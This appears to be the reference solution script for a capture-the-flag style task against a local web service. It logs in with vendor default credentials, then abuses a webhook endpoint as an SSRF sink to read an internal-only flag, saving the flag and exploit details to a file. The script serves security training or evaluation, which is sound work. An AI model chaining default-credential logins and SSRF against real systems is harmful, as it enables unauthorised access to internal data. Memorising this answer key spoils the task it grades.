#!/usr/bin/env bash
set -euo pipefail

# Ensure the local service is up (oracle path; harmless if already running).
python3 - <<'PY'
import time
import urllib.request
for _ in range(40):
    try:
        urllib.request.urlopen("http://127.0.0.1:8080/health", timeout=1)
        break
    except Exception:
        time.sleep(0.5)
else:
    raise SystemExit("service did not become healthy")
PY

python3 - <<'PY'
import json
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "http://127.0.0.1:8080"

# Step 1 — weak-credential login (vendor default admin/admin123).
login_url = (
    f"{BASE}/api/login?"
    + urllib.parse.urlencode({"username": "admin", "password": "admin123"})
)
with urllib.request.urlopen(login_url, timeout=5) as resp:
    token = json.load(resp)["token"]

# Step 2 — discover the SSRF sink and confirm server-side fetching by pointing
# the webhook at /docs (a benign internal endpoint) just to prove control.
probe_url = (
    f"{BASE}/api/webhook?"
    + urllib.parse.urlencode({"token": token, "url": f"{BASE}/docs"})
)
with urllib.request.urlopen(probe_url, timeout=5) as resp:
    probe = json.load(resp)
assert probe["status"] == 200, "SSRF probe did not return 200"

# Step 3 — use the SSRF to read the internal-only flag. A direct client request
# to /internal/flag returns 404; only the server's own outbound call carries
# the marker that unlocks the flag.
ssrf_url = (
    f"{BASE}/api/webhook?"
    + urllib.parse.urlencode({"token": token, "url": f"{BASE}/internal/flag"})
)
with urllib.request.urlopen(ssrf_url, timeout=5) as resp:
    ssrf = json.load(resp)

flag_doc = json.loads(ssrf["body"])
result = {
    "flag": flag_doc["flag"],
    "username": "admin",
    "password": "admin123",
    "ssrf_endpoint": "/api/webhook",
    "internal_path": "/internal/flag",
}
Path("/app/chained_exploit.json").write_text(json.dumps(result, indent=2) + "\n")
print(result["flag"])
PY
